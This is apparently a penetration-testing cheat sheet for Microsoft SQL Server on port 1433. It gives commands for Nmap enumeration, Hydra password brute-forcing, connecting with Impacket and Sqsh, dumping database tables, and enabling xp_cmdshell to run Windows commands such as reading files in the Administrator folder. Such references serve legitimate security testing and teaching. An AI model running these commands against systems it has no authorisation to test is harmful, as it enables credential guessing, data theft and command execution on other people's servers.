---
title: Microsoft SQL (MSSQL) Pentesting
desc: Default port is 1433.
tags: [1433, Database, Impacket, MSSQL, Nmap, Sqsh, Windows]
alts: []
render_with_liquid: false
---

## 1. Enumeration

1. **Use Nmap**

    ```sh
    nmap --script ms-sql-info -p 1433 <target-ip>
    nmap --script ms-sql-config -p 1433 <target-ip>
    nmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 <target-ip>
    nmap --script ms-sql-* -p 1433 <target-ip>
    ```

2. **Brute Force Credentials**

    ```sh
    hydra -L usernames.txt –p password <target-ip> mssql
    hydra -l username –P passwords.txt <target-ip> mssql
    ```

<br />

## 2. Connect

1. **Use Impacket**

    ```sh
    impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip>
    impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip> -windows-auth
    ```

2. **Use Sqsh**

    ```sh
    sqsh -S <target-ip> -U username -P password
    sqsh -S <target-ip> -U username -P password -D database
    ```

<br />

## 3. Basic Commands

1. **Commonly Used**

    ```sh
    # Get databases
    > SELECT * FROM master.dbo.sysdatabases

    # Get table content
    > SELECT * FROM <database_name>.dbo.<table_name>
    ```

<br />

## 4. Spawn a Windows Command Shell and Executing using Impacket

If you connected MSSQL using **impacket**, you can exeucte the Windows Shell Commands by **"enable_xp_cmdshell"**.

1. **Enable/Disable a Windows Shell**


    ```powershell
    > enable_xp_cmdshell
    > disable_xp_cmdshell
    ```

2. **Basic Commands**

    You can execute commands the same as Windows Command Prompt.

    ```powershell
    # Get current user
    > xp_cmdshell whoami

    # Show files and directories
    > xp_cmdshell dir
    > xp_cmdshell dir \Users
    # Show hidden files
    > xp_cmdshell dir /a

    # Get current directory
    > xp_cmdshell cd

    # Get contents of file
    > xp_cmdshell more \Users\Administrator\example.txt
    > xp_cmdshell type \Users\Administrator\example.txt
    ```